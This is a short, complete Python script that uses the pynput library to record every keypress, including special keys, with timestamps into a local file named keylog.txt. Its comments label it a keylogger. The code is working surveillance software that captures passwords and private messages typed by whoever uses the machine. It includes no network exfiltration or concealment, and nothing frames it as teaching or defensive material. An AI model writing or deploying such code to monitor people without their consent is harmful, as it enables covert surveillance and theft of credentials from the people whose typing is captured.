from pynput import keyboard
import logging

# Log file where keys will be stored
log_file = "keylog.txt"

# Set up logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to handle key presses
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special Key {key} pressed")

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()